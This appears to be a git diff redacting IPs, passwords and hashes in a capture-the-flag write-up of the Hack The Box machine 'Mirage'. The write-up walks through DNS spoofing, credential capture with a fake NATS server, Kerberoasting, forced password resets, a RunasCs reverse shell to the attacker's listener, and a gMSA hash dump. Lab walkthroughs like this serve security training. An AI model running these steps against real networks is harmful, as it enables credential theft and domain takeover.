@@ -15,9 +15,9 @@ Author: [EmSec](https://app.hackthebox.com/users/962022) and [ctrlzero](https://
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.254.128                                   
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx                                   
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 17:01 EDT
-Nmap scan report for 10.129.254.128
+Nmap scan report for 10.129.xx.xx
 Host is up (0.17s latency).
 Not shown: 986 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
@@ -88,7 +88,7 @@ Nmap done: 1 IP address (1 host up) scanned in 169.73 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.254.128     dc01.mirage.htb mirage.htb
+10.129.xx.xx     dc01.mirage.htb mirage.htb
 ```
 
 So this machine does not have provided credentials, but we found this in the nmap scan:
@@ -102,26 +102,26 @@ Searching and found out this [link](https://linux.die.net/man/8/mountd) about `m
 ### NFS Enumeration
 Found this [link](https://www.netexec.wiki/nfs-protocol/enumeration) about NFS enumeration.
 ```bash
-└─$ nxc nfs 10.129.254.128 --shares
-NFS         10.129.254.128  2049   10.129.254.128   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
-NFS         10.129.254.128  2049   10.129.254.128   [*] Enumerating NFS Shares
-NFS         10.129.254.128  2049   10.129.254.128   UID        Perms    Storage Usage    Share                          Access List    
-NFS         10.129.254.128  2049   10.129.254.128   ---        -----    -------------    -----                          -----------    
-NFS         10.129.254.128  2049   10.129.254.128   4294967294 r--      16.2GB/19.8GB    /MirageReports                 No network
+└─$ nxc nfs 10.129.xx.xx --shares
+NFS         10.129.xx.xx  2049   10.129.xx.xx   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.xx.xx  2049   10.129.xx.xx   [*] Enumerating NFS Shares
+NFS         10.129.xx.xx  2049   10.129.xx.xx   UID        Perms    Storage Usage    Share                          Access List    
+NFS         10.129.xx.xx  2049   10.129.xx.xx   ---        -----    -------------    -----                          -----------    
+NFS         10.129.xx.xx  2049   10.129.xx.xx   4294967294 r--      16.2GB/19.8GB    /MirageReports                 No network
 ```
 
 There is a share called `MirageReports` and let's mount it. <br>
 &rarr; Let's check the content of the share.
 
 ```bash
-└─$ nxc nfs 10.129.254.128 --share '/MirageReports' --ls '/'
-NFS         10.129.254.128  2049   10.129.254.128   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
-NFS         10.129.254.128  2049   10.129.254.128   UID        Perms  File Size     File Path
-NFS         10.129.254.128  2049   10.129.254.128   ---        -----  ---------     ---------
-NFS         10.129.254.128  2049   10.129.254.128   4294967294 dr--   64.0B         /MirageReports/.
-NFS         10.129.254.128  2049   10.129.254.128   4294967294 dr--   64.0B         /MirageReports/..
-NFS         10.129.254.128  2049   10.129.254.128   4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
-NFS         10.129.254.128  2049   10.129.254.128   4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
+└─$ nxc nfs 10.129.xx.xx --share '/MirageReports' --ls '/'
+NFS         10.129.xx.xx  2049   10.129.xx.xx   [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.xx.xx  2049   10.129.xx.xx   UID        Perms  File Size     File Path
+NFS         10.129.xx.xx  2049   10.129.xx.xx   ---        -----  ---------     ---------
+NFS         10.129.xx.xx  2049   10.129.xx.xx   4294967294 dr--   64.0B         /MirageReports/.
+NFS         10.129.xx.xx  2049   10.129.xx.xx   4294967294 dr--   64.0B         /MirageReports/..
+NFS         10.129.xx.xx  2049   10.129.xx.xx   4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
+NFS         10.129.xx.xx  2049   10.129.xx.xx   4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
 ```
 
 Now we need to mount the share to our local machine. Got this [link](https://hackviser.com/tactics/pentesting/services/nfs) about mounting NFS shares.
@@ -129,7 +129,7 @@ Now we need to mount the share to our local machine. Got this [link](https://hac
 ```bash
 └─$ mkdir mirage_reports_files
 
-└─$ sudo mount -t nfs 10.129.254.128:/MirageReports mirage_reports_files
+└─$ sudo mount -t nfs 10.129.xx.xx:/MirageReports mirage_reports_files
 
 └─$ cd mirage_reports_files 
 
@@ -144,7 +144,7 @@ Checking out the `Incident_Report_Missing_DNS_Record_nats-svc.pdf` file and foun
 
 Add it to `/etc/hosts` file:
 ```bash
-10.129.254.128     dc01.mirage.htb mirage.htb nats-svc.mirage.htb
+10.129.xx.xx     dc01.mirage.htb mirage.htb nats-svc.mirage.htb
 ```
 
 Here is the summary of two files: <br>
@@ -164,25 +164,25 @@ Here is the summary of two files: <br>
 ### DNS Spoofing
 But we can not see the port of the NATS service, so we google and found out that the default port is `4222`.
 ```bash
-└─$ sudo nmap -p4222 -sC -sV 10.129.254.128 
+└─$ sudo nmap -p4222 -sC -sV 10.129.xx.xx 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 18:09 EDT
-Nmap scan report for dc01.mirage.htb (10.129.254.128)
+Nmap scan report for dc01.mirage.htb (10.129.xx.xx)
 Host is up (0.16s latency).
 
 PORT     STATE SERVICE         VERSION
 4222/tcp open  vrml-multi-use?
 | fingerprint-strings: 
 |   GenericLines: 
-|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":81,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
+|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":81,"client_ip":"10.xx.xx.xx","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
 |     -ERR 'Authorization Violation'
 |   GetRequest: 
-|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":82,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
+|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":82,"client_ip":"10.xx.xx.xx","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
 |     -ERR 'Authorization Violation'
 |   HTTPOptions: 
-|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":83,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
+|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":83,"client_ip":"10.xx.xx.xx","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
 |     -ERR 'Authorization Violation'
 |   NULL: 
-|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":80,"client_ip":"10.10.14.54","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
+|     INFO {"server_id":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","server_name":"NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":80,"client_ip":"10.xx.xx.xx","xkey":"XCDDF6U5PYTNX2WMFM5UXN5XZ5JT5KOIGUBYBBDIOHL53GQ5FGMUVIDX"} 
 |_    -ERR 'Authentication Timeout'
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port4222-TCP:V=7.95%I=7%D=7/20%Time=687D6935%P=x86_64-pc-linux-gnu%r(NU
@@ -292,8 +292,8 @@ Then we will DNS Spoofing. So we gonna use [nsupdate](https://linux.die.net/man/
 
 ```bash
 └─$ nsupdate                                                          
-> server 10.129.254.128
-> update add nats-svc.mirage.htb 3600 A 10.10.14.54
+> server 10.129.xx.xx
+> update add nats-svc.mirage.htb 3600 A 10.xx.xx.xx
 > send
 ```
 
@@ -302,12 +302,12 @@ Now check back our honeypot.
 ```bash
 └─$ python3 fake_nats_server.py       
 🍯 NATS Honeypot on 0.0.0.0:4222
-📡 10.129.254.128:51943
-📨 b'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_re'...
-🎯 FOUND: Dev_Account_A:hx5h7F5554fP@1337!
+📡 10.129.xx.xx:51943
+📨 b'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@xxxxx","tls_re'...
+🎯 FOUND: Dev_Account_A:hx5h7F5554fP@xxxxx
 ```
 
-Got the `Dev_Account_A:hx5h7F5554fP@1337!` credentials. <br>
+Got the `Dev_Account_A:hx5h7F5554fP@xxxxx` credentials. <br>
 &rarr; Now we gonna data exfiltrate from this credentials.
 
 ### NATS
@@ -323,9 +323,9 @@ So we need to upgrade our go version. Go to [go.dev](https://go.dev/doc/install)
 Now let's start verify the credentials.
 
 ```bash
-└─$ nats --server nats://10.129.254.128:4222 \
+└─$ nats --server nats://10.129.xx.xx:4222 \
      --user Dev_Account_A \
-     --password 'hx5h7F5554fP@1337!' \
+     --password 'hx5h7F5554fP@xxxxx' \
      --timeout 5s \
      account info
 Account Information
@@ -334,12 +334,12 @@ Account Information
                         Account: dev
                         Expires: never
                       Client ID: 1,179
-                      Client IP: 10.10.14.54
+                      Client IP: 10.xx.xx.xx
                             RTT: 181ms
               Headers Supported: true
                 Maximum Payload: 1.0 MiB
-                  Connected URL: nats://10.129.254.128:4222
-              Connected Address: 10.129.254.128:4222
+                  Connected URL: nats://10.129.xx.xx:4222
+              Connected Address: 10.129.xx.xx:4222
             Connected Server ID: NBWNBXY5FTONAPJ7DEBVEKD5TVE4BFABLTRKEYLZIK6FCWXRG2TH3FIL
        Connected Server Version: 2.11.3
                  TLS Connection: no
@@ -377,9 +377,9 @@ Account Limits:
 Next, we will enumerate the available data streams.
 
 ```bash
-└─$ nats --server nats://10.129.254.128:4222 \
+└─$ nats --server nats://10.129.xx.xx:4222 \
      --user Dev_Account_A \
-     --password 'hx5h7F5554fP@1337!' \
+     --password 'hx5h7F5554fP@xxxxx' \
      stream ls
 ╭─────────────────────────────────────────────────────────────────────────────────╮
 │                                     Streams                                     │
@@ -394,9 +394,9 @@ Found one stream called `auth_logs`. <br>
 &rarr; Let's check details info about this stream.
 
 ```bash
-└─$ nats --server nats://10.129.254.128:4222 \
+└─$ nats --server nats://10.129.xx.xx:4222 \
      --user Dev_Account_A \
-     --password 'hx5h7F5554fP@1337!' \
+     --password 'hx5h7F5554fP@xxxxx' \
      stream info auth_logs
 Information for Stream auth_logs created 2025-05-05 03:18:19
 
@@ -443,9 +443,9 @@ So we know that this stream is used to store the authentication logs. <br>
 &rarr; Let's create a new consumer to read the messages in this stream.
 
 ```bash
-└─$ nats --server nats://10.129.254.128:4222 \
+└─$ nats --server nats://10.129.xx.xx:4222 \
      --user Dev_Account_A \
-     --password 'hx5h7F5554fP@1337!' \
+     --password 'hx5h7F5554fP@xxxxx' \
      consumer add auth_logs test --pull --ack explicit
 ? Start policy (all, new, last, subject, 1h, msg sequence) all
 ? Replay policy instant
@@ -482,51 +482,51 @@ State:
 Now let's read the messages in this stream.
 
 ```bash
-└─$ nats --server nats://10.129.254.128:4222 \
+└─$ nats --server nats://10.129.xx.xx:4222 \
      --user Dev_Account_A \
-     --password 'hx5h7F5554fP@1337!' \
+     --password 'hx5h7F5554fP@xxxxx' \
      consumer next auth_logs test --count=10
 [05:05:48] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4
 
-{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
+{"user":"david.jjackson","password":"pN8kQmn6b86!xxxxx","ip":"10.10.10.20"}
 
 Acknowledged message
 
 [05:05:48] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3
 
-{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
+{"user":"david.jjackson","password":"pN8kQmn6b86!xxxxx","ip":"10.10.10.20"}
 
 Acknowledged message
 
 [05:05:49] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2
 
-{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
+{"user":"david.jjackson","password":"pN8kQmn6b86!xxxxx","ip":"10.10.10.20"}
 
 Acknowledged message
 
 [05:05:49] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1
 
-{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
+{"user":"david.jjackson","password":"pN8kQmn6b86!xxxxx","ip":"10.10.10.20"}
 
 Acknowledged message
 
 [05:05:50] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0
 
-{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
+{"user":"david.jjackson","password":"pN8kQmn6b86!xxxxx","ip":"10.10.10.20"}
 
 Acknowledged message
 
 nats: error: no message received: nats: timeout
 ```
 
-Nailed another credentials `david.jjackson:pN8kQmn6b86!1234@`. <br>
+Nailed another credentials `david.jjackson:pN8kQmn6b86!xxxxx`. <br>
 &rarr; To make sure, we gonna verify with kerberos authentication.
 
 ### Kerberos
 ```bash
-└─$ nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --generate-krb5-file krb5.conf 
+└─$ nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!xxxxx' -d mirage.htb -k --generate-krb5-file krb5.conf 
 SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!xxxxx
 ```
 
 So this one is a valid credentials. <br>
@@ -535,9 +535,9 @@ So this one is a valid credentials. <br>
 First, gonna generate a `krb5.conf` file.
 
 ```bash
-└─$ sudo nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --generate-krb5-file /etc/krb5.conf
+└─$ sudo nxc smb dc01.mirage.htb -u david.jjackson -p 'pN8kQmn6b86!xxxxx' -d mirage.htb -k --generate-krb5-file /etc/krb5.conf
 SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!xxxxx
 ```
 
 ```bash
@@ -563,7 +563,7 @@ SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackso
 Now gonna use [ldapsearch](https://linux.die.net/man/1/ldapsearch) to enumerate the users in the domain.
 
 ```bash
-└─$ ldapsearch -H ldap://10.129.254.128 -D "david.jjackson@mirage.htb" -w 'pN8kQmn6b86!1234@' -b "dc=mirage,dc=htb" "(objectClass=user)"
+└─$ ldapsearch -H ldap://10.129.xx.xx -D "david.jjackson@mirage.htb" -w 'pN8kQmn6b86!xxxxx' -b "dc=mirage,dc=htb" "(objectClass=user)"
 # extended LDIF
 #
 # LDAPv3
@@ -1248,7 +1248,7 @@ servicePrincipalName: HTTP/exchange.mirage.htb
 ### Kerberoasting
 Let's grab the ticket from `david.jjackson` account and then update the `KRB5CCNAME` environment variable.
 ```bash
-└─$ getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip 10.129.254.128         
+└─$ getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!xxxxx' -dc-ip 10.129.xx.xx         
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in david.jjackson.ccache
@@ -1280,7 +1280,7 @@ HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,O
 
 
 
-$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$ecead77d5b4c41fcd8e159049d95f5a0$5160f0ba7e6fae6853cdfaff39307619748c90316a85e6f3807893374160834db1fa3bc6714b37a1b6f421bed2c876b8b742ca4fcce87125b004698e5677a9a11764b0fa06f5cc6392d61e40a19317977427a1a1c830992e237763c391cc0175de39839e2975d3f730ecbf1f21d3479f8f6c9af85211cac10f1d86c6cf77db6f63995f5a5ed30640997d417ebd2512eb627f9e7fd4f0639bc71282088a634cbac8799983b76dd7f04d3dd376080b6c7a1bb261d153a1c0e2af272d68044d45d5084dc7cd3fd638dee7d851edb5319819e0e98616c4697db1e479b5d894d30b6fa22d44a93c79c180300b95a8c8ac21827e9e424ae2f994ceadf8ed7a6ef8cb1952b5d501e1cf2ed84860e8a466bda226ac5db705ca2026cf880a8bfd1e6d4157d0ee9441d8c30bcf29a3a622a3635e65af4e8f7e066e337944266e40705ca54ef2b0a57698d9965bb4ce39943246b9d629c3a36136667bcc280247ff1b970ca50cb8431f49cb32098a3f610ae252351715a535ab15cb9b10007ea410970be044bfd29e0847fc5038ec7223eda3873807cf206ef95d92e0dcb00328c6c713cafb4cd9fb4de38f60f04b6695807e11bcdc18da7eff5458601c124154ea5d5443316a1bb888bed29621c7c9ceca1e3169a87f6cf7d7387aa27d11d8c4a95aea7279a5cd2dbc83e726403a8bd85e8b70d447bd1bacef180e7cb1b6dfc767ff3cd6740c39fa672f576c10793f1073f9402f92f3f5916e8c3371b594c702cc7008d28cfa7d362adf5ee3af98330a122b1846e99b092a5bffe0d60a65c1102ccc4c1a8fd54fd337b7b535c3dad867918efbd9b458d9402e2435f1fcdc6df3e180fd4fdad4378acdca961fd7ff41329e55f42b38ea9f50d63478e177238a4504a3b8b639339310b6eb5f312ee25730192972ccca81d4f333ca5c91123d7a76552ad8f2108d2dd6353478696b772f583f1451788e8a8c28852c3ee5a57e5221b5eb1589468784651402f85fcd4e130db47afd4632e6fd17a0de656f6e0d77118a31f56d85bd5c48efa284917d92faffdfe23a28e8818875d623c958c4b88eda695882a399f6ccd8fc9208f44bcd5813fe5e87567a73f3befa2400c5969f79c5759299d00cfebc0ce151819a0ba658f9fe567111649e2edc0cc6de2f1a9cde0d0f127b2321bd6fff20a0f5adc974be2938067fdcf46ac5ed81cefae440c72429a3a41c7377e03b2425b9027eb5225f03afb2a90b0251d7e713a163b1cd784b8bd22ec769c948b7f6edd9da482c5b6a0c474b876137ffcd917e29a255a213487b6e6f3f285bf8e0bf0e83590007a5c619440ce92175d873a25bbcf8ddcb521bbb2721e6031a1f663ff82a03705faf907db98e5d04a7091f109657e6f78e4fda84058c5a78c0882338474c9375c3e730387d9fccfd20fe3683632c32621afcc6b0b20190cbb0507d09a6877fdd305e0655db823602f56f13d6b3068499563f6f9ed01bcde74db8e8d92362f2b618082839837b618a78285d443fc9fee0189ff5dd0f7d665c8892335f2313341f565056050f476640993a7a8fa006914205e0
+$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$ecead77d5b4c41fcd8e159049d95f5a0$<SNIP>
 ```
 
 Save it to `kerberoast_hashes.txt` file and then use `john` to crack the hashes.
@@ -1291,7 +1291,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-3edc#EDC3        (?)     
+3edc#xxxx        (?)     
 1g 0:00:00:43 DONE (2025-07-21 12:33) 0.02308g/s 287906p/s 287906c/s 287906C/s 3er733..3ddfiebw
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
@@ -1299,24 +1299,24 @@ Session completed.
 
 ```bash
 └─$ john --show kerberoast_hashes.txt
-?:3edc#EDC3
+?:3edc#xxxx
 
 1 password hash cracked, 0 left
 ```
 
-Got the password `3edc#EDC3` for `nathan.aadam` account. <br>
+Got the password `3edc#xxxx` for `nathan.aadam` account. <br>
 &rarr; Gonna verify it.
 
 ```bash
-└─$ nxc smb dc01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k
+└─$ nxc smb dc01.mirage.htb -u nathan.aadam -p '3edc#xxxx' -d mirage.htb -k
 SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#xxxx
 ```
 
 Good to go, let's get the `nathan.aadam` ticket and update the environment variable.
 
 ```bash
-└─$ getTGT.py mirage.htb/nathan.aadam:'3edc#EDC3' -dc-ip 10.129.254.128          
+└─$ getTGT.py mirage.htb/nathan.aadam:'3edc#xxxx' -dc-ip 10.129.xx.xx          
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in nathan.aadam.ccache
@@ -1352,7 +1352,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> type user.txt
-d978de7d3aca6cec084dda46a33aa41d
+d978dexxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab the `user.txt` flag.
@@ -1362,7 +1362,7 @@ After we get the access to `nathan.aadam` account, let's get some `bloodhound` t
 
 ### Bloodhound
 ```bash
-└─$ bloodhound-python -u 'nathan.aadam' -p '3edc#EDC3' -d mirage.htb -c All -o bloodhound_results.json -ns 10.129.254.128 -k
+└─$ bloodhound-python -u 'nathan.aadam' -p '3edc#xxxx' -d mirage.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx -k
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: mirage.htb
 INFO: Using TGT from cache
@@ -1484,22 +1484,22 @@ After checking, we got the password for `mark.bbond` account.
     Some AutoLogon credentials were found
     DefaultDomainName             :  MIRAGE
     DefaultUserName               :  mark.bbond
-    DefaultPassword               :  1day@atime
+    DefaultPassword               :  1day@xxxxx
 ```
 
 We can verify it if it can still be used.
 
 ```bash
-└─$ nxc smb dc01.mirage.htb -u mark.bbond -p '1day@atime' -d mirage.htb -k
+└─$ nxc smb dc01.mirage.htb -u mark.bbond -p '1day@xxxxx' -d mirage.htb -k
 SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@xxxxx
 ```
 
 Now let's change the `javier.mmarshall` password.
 
 ### ForceChangePassword
 ```bash
-└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'p@ssw4rd123'
+└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@xxxxx' set password javier.mmarshall 'p@ssw4rd123'
 [+] Password changed successfully!
 ```
 
@@ -1508,7 +1508,7 @@ Now let's change the `javier.mmarshall` password.
 Now grab the ticket from `javier.mmarshall` account.
 
 ```bash
-└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.254.128                                                   
+└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.xx.xx                                                   
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -1518,7 +1518,7 @@ Oh no, it's revoked. Aww, we forgot to enable `javier.mmarshall` account. <br>
 &rarr; Let's use `mark.bbond` credentials in `nathan.aadam` session to enable `javier.mmarshall` account.
 
 ```powershell
-*Evil-WinRM* PS C:\temp> $Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
+*Evil-WinRM* PS C:\temp> $Password = ConvertTo-SecureString "1day@xxxxx" -AsPlainText -Force
 *Evil-WinRM* PS C:\temp> $Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
 ```
 
@@ -1544,12 +1544,12 @@ javier.mmarshall    True {255, 255, 255, 255...}
 The account is enabled now, let's grab the ticket from `javier.mmarshall` account.
 
 ```bash
-└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'p@ssw4rd123'
+└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@xxxxx' set password javier.mmarshall 'p@ssw4rd123'
 [+] Password changed successfully!
 ```
 
 ```bash
-└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.254.128
+└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.xx.xx
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in javier.mmarshall.ccache
@@ -1569,7 +1569,7 @@ listening on [any] 3333 ...
 Run the `RunasCs` command.
 
 ```powershell
-*Evil-WinRM* PS C:\temp> .\RunasCs.exe mark.bbond '1day@atime' cmd.exe -r 10.10.14.54:3333
+*Evil-WinRM* PS C:\temp> .\RunasCs.exe mark.bbond '1day@xxxxx' cmd.exe -r 10.xx.xx.xx:3333
 [*] Warning: The logon for user 'mark.bbond' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 
 [+] Running in session 0 with process function CreateProcessWithLogonW()
@@ -1580,7 +1580,7 @@ Run the `RunasCs` command.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 3333
 listening on [any] 3333 ...
-connect to [10.10.14.54] from (UNKNOWN) [10.129.254.128] 59425
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 59425
 Microsoft Windows [Version 10.0.20348.3807]
 (c) Microsoft Corporation. All rights reserved.
 
@@ -1713,9 +1713,9 @@ Gonna use this [gMSADumper](https://github.com/micahvandeusen/gMSADumper/blob/ma
 └─$ python3 gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb
 Users or groups who can read password for Mirage-Service$:
  > javier.mmarshall
-Mirage-Service$:::305806d84f7c1be93a07aaf40f0c7866
